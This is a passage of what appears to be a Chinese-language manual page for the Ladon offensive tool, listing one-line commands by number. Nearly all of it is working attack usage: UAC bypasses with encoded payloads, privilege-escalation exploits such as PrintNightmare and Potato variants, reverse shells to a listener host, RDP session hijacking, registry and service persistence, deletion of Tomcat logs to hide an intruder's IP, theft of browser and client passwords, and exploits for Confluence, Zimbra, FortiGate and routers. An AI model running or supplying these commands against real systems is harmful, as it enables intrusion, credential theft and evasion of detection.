+<p>Ladon WinrmExec 192.168.1.8 5985 <a href="http://k8gege.org">k8gege.org</a> Administrator K8gege520 calc.exe</p>
+<h3 id="提权降权">提权降权</h3>
+<h5 id="108-whoami查看当前用户权限以及特权">108 whoami查看当前用户权限以及特权</h5>
+<p>Ladon whoami</p>
+<h5 id="109-6种白名单BypassUAC-8-0后-Win7-Win10">109  6种白名单BypassUAC(8.0后)Win7-Win10</h5>
+<p>用法: Ladon BypassUAC Method Base64Cmd</p>
+<p>Ladon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>
+Ladon BypassUAC fodhelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>
+Ladon BypassUAC computerdefaults Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>
+Ladon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>
+Ladon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>
+Ladon BypassUAC dikcleanup Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==</p>
+<h5 id="110-BypassUac2-绕过UAC执行-支持Win7-Win10">110 BypassUac2 绕过UAC执行,支持Win7-Win10</h5>
+<p>Ladon BypassUac2 c:\1.exe<br>
+Ladon BypassUac2 c:\1.bat</p>
+<h5 id="111-PrintNightmare-CVE-2021-1675-CVE-2021-34527-打印机漏洞提权EXP">111 PrintNightmare (CVE-2021-1675 | CVE-2021-34527)打印机漏洞提权EXP</h5>
+<p>Ladon PrintNightmare c:\evil.dll<br>
+Ladon CVE-2021-1675 c:\evil.dll</p>
+<h5 id="112-CVE-2022-21999-SpoolFool打印机漏洞提权EXP">112 CVE-2022-21999 SpoolFool打印机漏洞提权EXP</h5>
+<p>Ladon SpoolFool poc.dll<br>
+Ladon CVE-2022-21999 poc.dll</p>
+<h5 id="113-GetSystem-提权System权限执行CMD">113 GetSystem 提权System权限执行CMD</h5>
+<p>Ladon GetSystem cmd.exe</p>
+<h5 id="114-复制令牌执行CMD-如system权限降权exploer当前用户">114 复制令牌执行CMD(如system权限降权exploer当前用户)</h5>
+<p>Ladon GetSystem cmd.exe explorer</p>
+<h5 id="115-Runas-模拟用户执行命令">115 Runas 模拟用户执行命令</h5>
+<p>Ladon Runas user pass cmd</p>
+<h5 id="116-MS16135提权至SYSTEM">116 MS16135提权至SYSTEM</h5>
+<p>Ladon ms16135 whoami   &gt;=9.2.1版本移除</p>
+<h5 id="117-BadPotato服务用户提权至SYSTEM">117 BadPotato服务用户提权至SYSTEM</h5>
+<p>Ladon BadPotato cmdline</p>
+<h5 id="118-SweetPotato服务用户提权至SYSTEM">118 SweetPotato服务用户提权至SYSTEM</h5>
+<p>Ladon SweetPotato cmdline</p>
+<h5 id="119-EfsPotato-Win7-2019提权-服务用户权限提到system">119 EfsPotato Win7-2019提权(服务用户权限提到system)</h5>
+<p>Ladon EfsPotato whoami</p>
+<h5 id="120-Open3389一键开启3389">120 Open3389一键开启3389</h5>
+<p>Ladon Open3389</p>
+<h5 id="121-激活内置管理员Administrator">121 激活内置管理员Administrator</h5>
+<p>Ladon ActiveAdmin</p>
+<h5 id="122-激活内置用户Guest">122 激活内置用户Guest</h5>
+<p>Ladon ActiveGuest</p>
+<h3 id="反弹Shell">反弹Shell</h3>
+<h5 id="123-反弹TCP-NC-Shell">123 反弹TCP NC Shell</h5>
+<p>Ladon ReverseTcp 192.168.1.8 4444 nc</p>
+<h5 id="124-反弹TCP-MSF-Shell">124 反弹TCP MSF Shell</h5>
+<p>Ladon ReverseTcp 192.168.1.8 4444 shell</p>
+<h5 id="125-反弹TCP-MSF-MET-Shell">125 反弹TCP MSF MET Shell</h5>
+<p>Ladon ReverseTcp 192.168.1.8 4444 meter</p>
+<h5 id="126-反弹HTTP-MSF-MET-Shell">126 反弹HTTP MSF MET Shell</h5>
+<p>Ladon ReverseHttp 192.168.1.8 4444</p>
+<h5 id="127-反弹HTTPS-MSF-MET-Shell">127 反弹HTTPS MSF MET Shell</h5>
+<p>Ladon ReverseHttps 192.168.1.8 4444</p>
+<h5 id="128-反弹TCP-CMD-PowerShell-Shell">128 反弹TCP CMD &amp; PowerShell Shell</h5>
+<p>Ladon PowerCat 192.168.1.8 4444 cmd<br>
+Ladon PowerCat 192.168.1.8 4444 psh</p>
+<h5 id="129-反弹UDP-Cmd-PowerShell-Shell">129 反弹UDP Cmd &amp; PowerShell Shell</h5>
+<p>Ladon PowerCat 192.168.1.8 4444 cmd udp<br>
+Ladon PowerCat 192.168.1.8 4444 psh udp</p>
+<h5 id="130-netsh本机888端口转发至112的22端口">130  netsh本机888端口转发至112的22端口</h5>
+<p>Ladon netsh add 888 192.168.1.112 22</p>
+<h5 id="131-PortTran端口转发-3389例子">131  PortTran端口转发(3389例子)</h5>
+<p>VPS监听: Ladon PortTran 8000 338<br>
+目标转发: Ladon PortTran 内网IP 3389 VPS_IP 8000<br>
+本机连接: mstsc VPS_IP:338</p>
+<h3 id="本机执行">本机执行</h3>
+<h5 id="132-RDP桌面会话劫持（无需密码）">132 RDP桌面会话劫持（无需密码）</h5>
+<p>Ladon RdpHijack 3<br>
+Ladon RdpHijack 3 console</p>
+<h5 id="133-添加注册表Run启动项">133 添加注册表Run启动项</h5>
+<p>Ladon RegAuto Test c:\123.exe</p>
+<h5 id="134-AT计划执行程序-无需时间-system权限">134 AT计划执行程序(无需时间)(system权限)</h5>
+<p>Ladon at c:\123.exe<br>
+Ladon at c:\123.exe gui</p>
+<h5 id="135-SC服务加启动项-执行程序-system权限）">135 SC服务加启动项&amp;执行程序(system权限）</h5>
+<p>Ladon sc c:\123.exe<br>
+Ladon sc c:\123.exe gui<br>
+Ladon sc c:\123.exe auto ServerName</p>
+<h3 id="系统信息探测">系统信息探测</h3>
+<h5 id="136-Snmp协议探测操作系统、设备等信息">136  Snmp协议探测操作系统、设备等信息</h5>
+<p>Ladon 192.168.1.8/24 SnmpInfo</p>
+<h5 id="137-Nbt协议探测Windows主机名、域、用户">137  Nbt协议探测Windows主机名、域、用户</h5>
+<p>Ladon 192.168.1.8/24 NbtInfo</p>
+<h5 id="138-Smb协议探测Windows版本、主机名、域">138  Smb协议探测Windows版本、主机名、域</h5>
+<p>Ladon 192.168.1.8/24 SmbInfo</p>
+<h5 id="139-Wmi协议探测Windows版本、主机名、域">139  Wmi协议探测Windows版本、主机名、域</h5>
+<p>Ladon 192.168.1.8/24 WmiInfo</p>
+<h5 id="140-Mssql协议探测Windows版本、主机名、域">140  Mssql协议探测Windows版本、主机名、域</h5>
+<p>Ladon 192.168.1.8/24 MssqlInfo</p>
+<h5 id="141-Winrm协议探测Windows版本、主机名、域">141  Winrm协议探测Windows版本、主机名、域</h5>
+<p>Ladon 192.168.1.8/24 WinrmInfo</p>
+<h5 id="142-Exchange探测Windows版本、主机名、域">142  Exchange探测Windows版本、主机名、域</h5>
+<p>Ladon 192.168.1.8/24 ExchangeInfo</p>
+<h5 id="143-Rdp协议探测Windows版本、主机名、域">143  Rdp协议探测Windows版本、主机名、域</h5>
+<p>For单线程: Ladon 192.168.1.8/24 RdpInfo f=1</p>
+<h3 id="其它功能">其它功能</h3>
+<h5 id="144-Win2008一键启用-net-3-5">144 <a target="_blank" rel="noopener" href="http://xn--Win2008-cu3ks37bzl4fqvwd.net">Win2008一键启用.net</a> 3.5</h5>
+<p>Ladon EnableDotNet</p>
+<h5 id="145-获取内网站点HTML源码">145 获取内网站点HTML源码</h5>
+<p>Ladon gethtml <a target="_blank" rel="noopener" href="http://192.168.1.1">http://192.168.1.1</a></p>
+<h5 id="146-一键迷你WEB服务器">146 一键迷你WEB服务器</h5>
+<p>Ladon web 80<br>
+Ladon web 80 dir</p>
+<p>获取外网IP(VPS上启动WEB,目标访问ip.txt或ip.jpg)<br>
+<a target="_blank" rel="noopener" href="http://192.168.1.8/ip.txt">http://192.168.1.8/ip.txt</a></p>
+<h5 id="147-getstr-getb64-debase64-savetxt-无回显漏洞回显结果">147 getstr/getb64/debase64/savetxt(无回显漏洞回显结果)</h5>
+<p>监听 Ladon web 800</p>
+<p>提交 返回明文<br>
+certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.1.8:800/getstr/test123456">http://192.168.1.8:800/getstr/test123456</a><br>
+Base64加密结果<br>
+certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.1.110:800/getbase64/k8gege520">http://192.168.1.110:800/getbase64/k8gege520</a><br>
+Base64结果解密<br>
+certutil.exe -urlcache -split -fhttp://192.168.1.110:800/debase64/azhnZWdlNTIw</p>
+<h5 id="148-Shiro插件探测">148 Shiro插件探测</h5>
+<p>Ladon 192.168.1.8/24 IsShiro</p>
+<h5 id="149-LogDelTomcat-删除Tomcat指定IP日志">149 LogDelTomcat 删除Tomcat指定IP日志</h5>
+<p>Ladon LogDelTomcat access.log 192.168.1.8</p>
+<h5 id="150-C-自定义程序集插件扫描">150 C#自定义程序集插件扫描</h5>
+<p>Ladon 192.168.1.8/24 Poc.exe<br>
+Ladon 192.168.1.8/24 *.dll(c#)</p>
+<h5 id="151-ReadFile-读取大文件前面指定长度内容">151 ReadFile 读取大文件前面指定长度内容</h5>
+<p>Ladon ReadFile c:\k8.exe 默认1k<br>
+Ladon ReadFile c:\k8.exe 1K<br>
+Ladon ReadFile c:\k8.exe 1024K<br>
+Ladon ReadFile c:\k8.exe 1M</p>
+<h5 id="152-修改注册表读取2012及后系统明文密码">152 修改注册表读取2012及后系统明文密码</h5>
+<p>Ladon SetMzLogonPwd 1</p>
+<h5 id="153-修改注册表劫持签名签证">153 修改注册表劫持签名签证</h5>
+<p>Ladon SetSignAuth 1</p>
+<h5 id="154-IP24-批量IP转成ip24格式-192-168-1-1-24">154 IP24 批量IP转成ip24格式(192.168.1.1/24)</h5>
+<p>Ladon ip.txt IP24</p>
+<h5 id="155-IPC-批量IP转成ip-C格式-192-168-1">155 IPC  批量IP转成ip C格式(192.168.1.)</h5>
+<p>Ladon ip.txt IPC</p>
+<h5 id="156-IPB-批量IP转成ip-B格式-192-168">156 IPB  批量IP转成ip B格式(192.168.)</h5>
+<p>Ladon ip.txt IPB</p>
+<h5 id="157-漏洞检测Atlassian-Confluence-CVE-2022-26134">157 漏洞检测Atlassian Confluence CVE-2022-26134</h5>
+<p>Ladon url.txt CVE-2022-26134</p>
+<h5 id="158-Atlassian-Confluence-CVE-2022-26134-EXP">158 Atlassian Confluence CVE-2022-26134 EXP</h5>
+<p>Ladon EXP-2022-26134 <a target="_blank" rel="noopener" href="https://111.229.255.81">https://111.229.255.81</a> id</p>
+<h5 id="159-RevShell-2022-26134-CVE-2022-26134反弹Shell">159 RevShell-2022-26134  CVE-2022-26134反弹Shell</h5>
+<p>Ladon RevShell-2022-26134 TargetURL VpsIP VpsPort<br>
+Ladon RevShell-2022-26134 <a target="_blank" rel="noopener" href="http://xxx.com:8090">http://xxx.com:8090</a> 123.123.123.123 4444</p>
+<h5 id="160-SslInfo-证书探测设备、IP、域名、机器名、组织机构等信息">160 SslInfo 证书探测设备、IP、域名、机器名、组织机构等信息</h5>
+<p>Ladon <a href="https://k8gege.org">https://k8gege.org</a> SslInfo<br>
+Ladon <a href="http://k8gege.org">k8gege.org</a> SslInfo<br>
+Ladon <a href="http://k8gege.org:443">k8gege.org:443</a> SslInfo 指定端口<br>
+Ladon noping <a target="_blank" rel="noopener" href="http://fbi.gov">fbi.gov</a> SslInfo 禁ping探测<br>
+Ladon 192.168.1.1 SslInfo<br>
+Ladon 192.168.1.1:8443 SslInfo</p>
+<h5 id="161-SslInfo-证书批量探测设备、IP、域名、机器名、组织机构等信息">161 SslInfo 证书批量探测设备、IP、域名、机器名、组织机构等信息</h5>
+<p>Ladon ip.txt SslInfo<br>
+Ladon url.txt SslInfo<br>
+Ladon 192.168.1.1/c SslInfo<br>
+Ladon 192.168.1.1/b SslInfo</p>
+<h5 id="162-WPinfo-多种方法获取WordPress主程序、主题、插件版本">162 WPinfo 多种方法获取WordPress主程序、主题、插件版本</h5>
+<p>Ladon <a href="https://k8gege.org">https://k8gege.org</a> WPinfo<br>
+Ladon <a href="http://k8gege.org">k8gege.org</a> WPinfo<br>
+Ladon noping <a target="_blank" rel="noopener" href="http://fbi.gov">fbi.gov</a> WPinfo 禁ping探测<br>
+Ladon 192.168.1.1 WPinfo<br>
+Ladon 192.168.1.1:8443 WPinfo</p>
+<h5 id="163-WPinfo-批量获取WordPress主程序、主题、插件版本">163 WPinfo 批量获取WordPress主程序、主题、插件版本</h5>
+<p>Ladon ip.txt WPinfo<br>
+Ladon url.txt WPinfo<br>
+Ladon 192.168.1.1/c WPinfo<br>
+Ladon 192.168.1.1/b WPinfo</p>
+<h5 id="164-Exchange暴力破解-识别Exchange密码爆破">164  Exchange暴力破解 识别Exchange密码爆破</h5>
+<p>Ladon <a href="http://k8gege.org">k8gege.org</a> ExchangeScan<br>
+Ladon 192.168.1.8 ExchangeScan<br>
+Ladon 192.168.1.8、24 ExchangeScan</p>
+<h5 id="165-CVE-2022-27925-批量探测Zimbra邮服ZIP目录穿越RCE漏洞">165 CVE-2022-27925 批量探测Zimbra邮服ZIP目录穿越RCE漏洞</h5>
+<p>Ladon 192.168.1.8 CVE-2022-27925<br>
+Ladon <a target="_blank" rel="noopener" href="http://zimbra.k8gege.org">http://zimbra.k8gege.org</a> CVE-2022-27925<br>
+Ladon ip.txt CVE-2022-27925<br>
+Ladon url.txt CVE-2022-27925<br>
+Ladon 192.168.1.1/c CVE-2022-27925<br>
+Ladon 192.168.1.1/b CVE-2022-27925</p>
+<h5 id="166-EXP-2022-27925-Zimbra邮服未授权RCE漏洞EXP-GetShell">166 EXP-2022-27925 Zimbra邮服未授权RCE漏洞EXP GetShell</h5>
+<p>Ladon EXP-2022-27925 <a target="_blank" rel="noopener" href="https://zimbra.k8gege.org">https://zimbra.k8gege.org</a> poc.zip</p>
+<h5 id="167-WebShellCmd-连接jsp-WebShell-支持cd、k8、ua、uab64">167 WebShellCmd 连接jsp WebShell(支持cd、k8、ua、uab64)</h5>
+<p>Ladon WebShell jsp ua <a target="_blank" rel="noopener" href="https://zimbra.k8gege.org">https://zimbra.k8gege.org</a> pass whoami</p>
+<h5 id="JSP-UAshell-查看系统版本、python、gcc等信息方便提权">JSP UAshell 查看系统版本、python、gcc等信息方便提权</h5>
+<p>Ladon WebShell jsp ua <a target="_blank" rel="noopener" href="https://zimbra.k8gege.org">https://zimbra.k8gege.org</a> pass OSinfo</p>
+<h5 id="168-WebShellCmd-连接jsp-WebShell-支持cd、k8、ua、uab64">168 WebShellCmd 连接jsp WebShell(支持cd、k8、ua、uab64)</h5>
+<p>Ladon WebShell jsp uab64 <a target="_blank" rel="noopener" href="https://zimbra.k8gege.org">https://zimbra.k8gege.org</a> pass whoami</p>
+<h5 id="169-非交互式连接IIS-Raid后门执行命令">169 非交互式连接IIS-Raid后门执行命令</h5>
+<p>Ladon IISdoor <a target="_blank" rel="noopener" href="http://192.168.1.142">http://192.168.1.142</a> whoami<br>
+Ladon IISdoor <a target="_blank" rel="noopener" href="http://192.168.1.142">http://192.168.1.142</a> SIMPLEPASS whoami</p>
+<h5 id="170-FindIP匹配IP段是否出现在漏洞结果中">170 FindIP匹配IP段是否出现在漏洞结果中</h5>
+<p>Ladon FindIP ipc.txt ISVUL.txt		 (精确搜索)<br>
+Ladon FindIP ipc.txt ISVUL.txt like  (模糊搜索)</p>
+<h5 id="171-CiscoPwd-CVE-2019-1653-Cisco-RV320-RV325-路由器密码读取">171 CiscoPwd CVE-2019-1653 Cisco RV320 RV325 路由器密码读取</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> CiscoPwd<br>
+Ladon url.txt CiscoPwd 批量探测Cisco漏洞并导出用户密码</p>
+<h5 id="172-PrinterPoc-打印机PJL任意代码执行漏洞批量检测">172 PrinterPoc  打印机PJL任意代码执行漏洞批量检测</h5>
+<p>Ladon 192.168.1.8 PrinterPoc<br>
+Ladon ip.txt PrinterPoc<br>
+禁ping机器扫描使用noping<br>
+Ladon noping 192.168.1.8 PrinterPoc<br>
+Ladon noping ip.txt PrinterPoc</p>
+<h5 id="173-通过Mac查询制造商-Ladon-Mac-MAC地址">173 通过Mac查询制造商(Ladon Mac MAC地址)</h5>
+<p>Ladon Mac ff-ff-ff-ff-ff-ff<br>
+Ladon Mac 01:00:5e:00:00:16<br>
+Ladon Mac ff5e00885d66</p>
+<h5 id="174-Cisco-VPN路由器密码爆破-内置默认密码，支持明文、Hash">174 Cisco VPN路由器密码爆破(内置默认密码，支持明文、Hash)</h5>
+<p>Ladon 192.168.1.8/24 CiscoScan<br>
+Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> CiscoScan<br>
+Ladon ip.txt CiscoScan<br>
+Ladon url.txt CiscoScan​</p>
+<h5 id="175-vsFTPdPocCVE-2011-2523-vsftpd-2-3-4-笑脸后门漏洞检测">175 vsFTPdPoc	CVE-2011-2523 vsftpd 2.3.4 笑脸后门漏洞检测</h5>
+<p>Ladon noping ip CVE-2011-2523<br>
+Ladon noping ip.txt vsFTPdPoc</p>
+<h5 id="176-WpScan-WordPress密码审计、弱口令">176 WpScan WordPress密码审计、弱口令</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a> WpScan<br>
+Ladon url.txt WpScan<br>
+Ladon 192.168.1.8/24 WpScan http  扫描IP时添加http://</p>
+<h5 id="177-探测Exchange版本不会触发WAF">177  探测Exchange版本不会触发WAF</h5>
+<p>Ladon 192.168.1.8/24 ExchangeVer</p>
+<h5 id="178-Exchange高危RCE漏洞检测">178  Exchange高危RCE漏洞检测</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> ExchangePoc</p>
+<h5 id="179-Http-S获取网页返回头信息">179 Http/S获取网页返回头信息</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> GetHead<br>
+Ladon ip.txt GetHead<br>
+Ladon 192.168.1.8/24 GetHead http  扫描IP时添加http://<br>
+Ladon ip.txt GetHead https		   扫描IP时添加https://</p>
+<h5 id="180-Http-S获取网页返回头信息-源码">180 Http/S获取网页返回头信息+源码</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> GetHtml<br>
+Ladon ip.txt GetHtml<br>
+Ladon 192.168.1.8/24 GetHtml http<br>
+Ladon ip.txt GetHtml https		   扫描IP时添加https://</p>
+<h5 id="181-Http-S获取网页中的域名">181 Http/S获取网页中的域名</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> GetDomain<br>
+Ladon ip.txt GetDomain<br>
+Ladon 192.168.1.8/24 GetDomain http<br>
+Ladon ip.txt GetDomain https		   扫描IP时添加https://</p>
+<h5 id="182-TrueIP获取域名真实IP-可用域名、标题、Banner等唯一关键字特征">182 TrueIP获取域名真实IP(可用域名、标题、Banner等唯一关键字特征)</h5>
+<p>Ladon ip.txt TrueIP <a href="http://k8gege.org">k8gege.org</a><br>
+Ladon 192.168.1.8/24 TrueIP <a href="http://k8gege.org">k8gege.org</a><br>
+Ladon ip.txt TrueIP “K8哥哥”<br>
+Ladon 192.168.1.8/24 TrueIP “K8哥哥”</p>
+<h5 id="183-Firefox密码-Cookie-历史记录读取">183 Firefox密码\Cookie\历史记录读取</h5>
+<p>Ladon FirefoxPwd<br>
+Ladon FirefoxHistory<br>
+Ladon FirefoxCookie</p>
+<h5 id="184-BypassUAC11无回显支持Win7、Win8、Win11-Win2012-2016-2019等">184  BypassUAC11无回显支持Win7、Win8、Win11 Win2012\2016\2019等</h5>
+<p>Ladon40 BypassUAC11 cmd<br>
+Ladon40 BypassUAC11 c:\1.bat<br>
+Ladon40 BypassUAC11 c:\1.exe</p>
+<h5 id="185-GetPwd支持Navicat、TeamView、Xshell、SecureCRT密码读取">185 GetPwd支持Navicat、TeamView、Xshell、SecureCRT密码读取</h5>
+<p>Ladon GetPwd</p>
+<h5 id="186-DraytekScan-密码审计Draytek弱口令检测">186 DraytekScan 密码审计Draytek弱口令检测</h5>
+<p>Ladon 192.168.1.8 DraytekScan<br>
+Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> DraytekScan<br>
+Ladon 192.168.1.8/24 DraytekScan<br>
+Ladon url.txt DraytekScan</p>
+<h5 id="187-XshellPwd-Xshell密码读取">187 XshellPwd Xshell密码读取</h5>
+<p>Ladon XshellPwd</p>
+<h5 id="188-ForiGate-CVE-2022-40684-未授权写SSH-KEY-admin-admin123">188 ForiGate CVE-2022-40684 未授权写SSH-KEY admin admin123</h5>
+<p>Ladon 192.168.1.8 CVE-2022-40684<br>
+Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> CVE-2022-40684<br>
+Ladon 192.168.1.8/24 CVE-2022-40684<br>
+Ladon url.txt CVE-2022-40684</p>
+<h5 id="189-MssqlCmd-SQL-Server远程执行命令-SQL版本、OS信息-xp-cmdshell">189 MssqlCmd  SQL Server远程执行命令 SQL版本、OS信息 xp_cmdshell</h5>
+<p>Ladon MssqlCmd 192.168.1.8 sa k8gege520 master info<br>
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master open_cmdshell<br>
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master xp_cmdshell whoami<br>
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master r_shell whoami<br>
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master ws_shell whoami<br>
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master py_cmdshell whoami</p>
+<h5 id="190-MssqlCmd-SQL-Server远程执行命令-efspotato、badpotato提权">190 MssqlCmd SQL Server远程执行命令 efspotato、badpotato提权</h5>
+<p>Ladon MssqlCmd 192.168.1.8 sa k8gege520 master install_clr<br>
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master uninstall_clr<br>
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_exec whoami<br>
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_efspotato whoami<br>
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_badpotato whoami</p>
+<h5 id="191-CVE-2018-14847-Mikrotik-RouterOS-6-29-6-42版本密码读取">191 CVE-2018-14847 Mikrotik RouterOS 6.29-6.42版本密码读取</h5>
+<p>Ladon 192.168.1.8 CVE-2018-14847<br>
+Ladon ip.txt CVE-2018-14847</p>
+<h5 id="192-ZteScan-中兴路由器光猫Web默认口令检测">192 ZteScan 中兴路由器光猫Web默认口令检测</h5>
+<p>Ladon 192.168.1.8 ZteScan<br>
+Ladon ip.txt ZteScan<br>
+Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a> ZteScan<br>
+Ladon url.txt ZteScan</p>
+<h5 id="193-MSNSwitchPwd-CVE-2022-32429-MSNSwitch路由器密码读取">193 MSNSwitchPwd CVE-2022-32429 MSNSwitch路由器密码读取</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> MSNSwitchPwd<br>
+Ladon url.txt MSNSwitchPwd 批量探测MSNSwitch漏洞并导出用户密码</p>
+<h5 id="194-NetGearPwd-NetGear-DGND3700v2路由器密码读取">194 NetGearPwd NetGear DGND3700v2路由器密码读取</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> NetGearPwd<br>
+Ladon url.txt NetGearPwd 批量NetGear漏洞导出用户密码</p>
+<h5 id="195-T3协议探测WebLogic版本">195 T3协议探测WebLogic版本</h5>
+<p>Ladon 192.168.1.8/24 T3Info<br>
+Ladon 192.168.1.8:7001 T3Info<br>
+Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8:7001">http://192.168.1.8:7001</a> T3Info</p>
+<h5 id="196-InfoScan多个模块探测系统信息">196 InfoScan多个模块探测系统信息</h5>
+<p>Ladon 192.168.1.8/24 InfoScan<br>
+Ladon 192.168.1.8 InfoScan</p>
+<h5 id="197-VulScan-PocScan多个远程漏洞检测">197 VulScan PocScan多个远程漏洞检测</h5>
+<p>Ladon 192.168.1.8/24 VulScan<br>
+Ladon 192.168.1.8 PocScan<br>
+Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a> PocScan</p>
+<h5 id="198-ExpScan多个漏洞利用GetShell">198 ExpScan多个漏洞利用GetShell</h5>
+<p>Ladon 192.168.1.8/24 ExpScan<br>
+Ladon 192.168.1.8 ExpScan<br>
+Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a> ExpScan</p>
+<h5 id="199-JoomlaPwd-CVE-2023-23752-未授权网站数据库密码读取">199 JoomlaPwd CVE-2023-23752 未授权网站数据库密码读取</h5>
+<p>Ladon 192.168.1.8/24 JoomlaPwd<br>
+Ladon 192.168.1.8 JoomlaPwd<br>
+Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a> JoomlaPwd<br>
+Ladon url.txt JoomlaPwd</p>
+<h5 id="200-AllScan-所有模块">200 AllScan 所有模块</h5>
+<p>Ladon 192.168.1.8/24 AllScan<br>
+Ladon 192.168.1.8 AllScan<br>
+Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a> AllScan</p>
+<h5 id="201-探测Citrix-Gateway版本">201 探测Citrix Gateway版本</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> CitrixVer<br>
+Ladon 192.168.1.8/24 CitrixVer<br>
+Ladon url.txt CitrixVer</p>
+<h5 id="202-探测Vmware-Vcenter版本">202 探测Vmware Vcenter版本</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="https://192.168.1.8">https://192.168.1.8</a> VmwareVer<br>
+Ladon 192.168.1.8/24 VmwareVer<br>
+Ladon url.txt VcenterVer</p>
+<h3 id="工具下载">工具下载</h3>
+<p>历史版本: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>
+911版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>
+V10.10：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt="" style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
+</div>
+    </div>
+</article>
+    
+</div>
+                </main>
+                
+                    
+<aside class="col-md-4 sidebar">
+    
+    
+<div class="widget">
+    <h3 class="title">
+        Search
+    </h3>
+    <div id="search-form">
+        <div id="result-mask" class="hide"></div>
+        <div class="search-area">
+            
+            <input id="search-key" type="search" autocomplete="off" placeholder="Search What？">
+            <button type="button" class="search-form-submit" id="search-local">
+                Search</button>
+            
+            
+        </div>
+        <div id="result-wrap" class="hide">
+            <div id="search-result"></div>
+        </div>
+        <div class="hide">
+            <template id="search-tpl">
+                <div class="item">
+                    <a href="/{path}" title="{title}">
+                        <div class="title">{title}</div>
+                        <div class="content">{content}</div>
+                    </a>
+                </div>
+            </template>
+        </div>
+    </div>
+</div>
+
+    
+    
+<div class="widget">
+    <h3 class="title">
+        Notification
+    </h3>
+    <div class="notification">
+        <p>
+    K8tools: <a href="https://github.com/k8gege/K8tools" title="" target="_blank">K8工具合集</a> <br>
+    K8blog: <a href="https://github.com/k8gege/k8blog" title="" target="_blank">V1.0 20200719</a> <br>
+    LadonGo: <a href="https://github.com/k8gege/LadonGo" title="" target="_blank">V5.2 20231214</a> <br>
+    Ladon: <a href="https://k8gege.org/Download/Ladon911.rar" title="" target="_blank">Ladon 911</a> <br>
+    Robot: <a href="https://github.com/k8gege/ChatLadon" title="" target="_blank">ChatLadon</a> <br>
+    Tools: <a href="http://k8gege.org/Download" title="" target="_blank">Download</a> <br>
+    CS4.4: <a href="https://github.com/k8gege/Aggressor/releases/tag/cs" title="" target="_blank">Cobalt Strike</a> <br>
+</p>
+    </div>
+</div>
+
+    
+    
+<div class="widget">
+    <h3 class="title">
+        Social
+    </h3>
+    <div class="content social">
+        
+        <a href="//github.com/k8gege" rel="external nofollow" title="Github" target="_blank">
+            <i class="git fa fa-git"></i>
+        </a>
+        
+        <a href="mailto:k8gege@gmail.com" rel="external nofollow" title="邮箱" target="_blank">
+            <i class="envelope-o fa fa-envelope-o"></i>
+        </a>
+        
+        <a href="/" rel="external nofollow" title="联系QQ" target="_blank">
+            <i class="qq fa fa-qq"></i>
+        </a>
+        
+        <a href="/" rel="external nofollow" title="微信" target="_blank">
+            <i class="weixin fa fa-weixin"></i>
+        </a>
+        
+        <a href="/" rel="external nofollow" title="QQ群" target="_blank">
+            <i class="users fa fa-users"></i>
+        </a>
+        
+        <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
+            <i class="feed fa fa-feed"></i>
+        </a>
+        
+    </div>
+</div>
+
+    
+    
+<div class="widget">
+    <h3 class="title">
+        Categories
+    </h3>
+    <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Dotnet/"><i class="fa" aria-hidden="true">.NET</i></a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Brute-Force/"><i class="fa" aria-hidden="true">Brute-Force</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/"><i class="fa" aria-hidden="true">CTF</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/"><i class="fa" aria-hidden="true">Cobalt Strike</i></a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DllHijack/"><i 